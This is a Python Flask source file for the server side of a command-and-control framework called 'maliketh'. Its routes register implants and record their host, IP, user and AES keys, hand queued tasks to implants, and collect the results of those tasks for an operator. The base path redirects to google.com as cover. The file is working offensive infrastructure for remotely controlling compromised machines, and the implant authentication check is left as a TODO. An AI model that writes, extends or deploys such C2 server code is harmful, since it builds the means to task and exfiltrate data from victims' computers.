from datetime import datetime
from typing import Callable
from flask import Blueprint, jsonify, redirect, request
from maliketh.db import db
import maliketh.crypto.aes
from maliketh.models import *
from functools import wraps
from maliketh.config import ROUTES
from maliketh.crypto.aes import GCM
import base64
import logging

c2 = Blueprint('c2', __name__, url_prefix=ROUTES['c2']['base_path'])

def implant_authenticated(func: Callable):
    """
    Decorator to check if the request is authenticated.
    """
    @wraps(func)
    def wrapper(*args, **kwargs):
        # TODO
        return func(*args, **kwargs)
    return wrapper

@c2.route("/")
def hello_c2():
    return redirect("https://google.com")

@c2.route(ROUTES["c2"]["register"]["path"], methods=ROUTES["c2"]["register"]["methods"])
def register():
    # /register
    # Body :
    # {
    #   "u": "username",
    #   "t": "base64 encoded token"
    # }
    

    try:
        u = request.json["u"]
        t = request.json["t"]
    except:
        return "Unauthorized", 401

    if len(u) > 128:
        return "Unauthorized", 401

    try:
        base64.b64decode(t)
    except:
        return "Unauthorized", 401

    # Create a new implant and add it to the db
    implant = Implant(
        implant_id=random_id(),
        hostname=request.host,
        ip=request.remote_addr,
        os=request.user_agent.platform,
        arch=request.user_agent.platform,
        user=u,
        aes_key=GCM.gen_key_b64(),
        aes_aad=t,
        created_at=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        last_seen=datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
    )

    db.session.add(implant)
    db.session.commit()

    resp = jsonify({"status": True, "id": implant.implant_id, "key": implant.aes_key, "aad": implant.aes_aad})
    resp.status_code = 200

    # Set cookie to implant ID
    resp.set_cookie(ROUTES["c2"]["implant_id_cookie"], implant.implant_id)
    
    return resp


@c2.route(ROUTES["c2"]["checkin"]["path"], methods=ROUTES["c2"]["checkin"]["methods"])
def get_task():
    # Get implant id from cookie
    implant_id = request.cookies.get(ROUTES["c2"]["implant_id_cookie"])

    if implant_id is None:
        return "Not Found", 404

    # Check if implant ID exists, if not, throw 404
    if get_implant_by_id(implant_id) is None:
        return "Not Found", 404

    # Get task from db
    task = get_oldest_task_for_implant(implant_id)

    # If task is not None, return task
    if task is not None:
        # Set the task as read
        task.read_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        task.status = TASKED
        db.session.commit()
        return jsonify(task.toJSON())
    # If task is None, return empty task
    return jsonify({})


"""
Get the output of a task and mark it as completed
"""
@c2.route(ROUTES["c2"]["task_results"]["path"], methods=ROUTES["c2"]["task_results"]["methods"])
def post_task(tid: str):
    # Get implant id from cookie
    implant_id = request.cookies.get(ROUTES["c2"]["implant_id_cookie"])

    if implant_id is None or tid is None:
        return "Not Found", 404

    # Check if implant ID exists, if not, throw 404
    implant = get_implant_by_id(implant_id)
    if implant is None:
        return "Not Found", 401

    implant.last_seen = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Get task from db
    task = get_task_by_id(tid)
    # If task is not None, return task
    if task is not None:
        # Get output from request
        output = request.data
        # Update task in db
        task.output = output
        task.status = COMPLETE
        task.executed_at = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        db.session.commit()

        # TODO: add output to rabbitmq queue for the operator

        return "OK"
    # If task is None, return empty task
    return "Not Found", 404
    


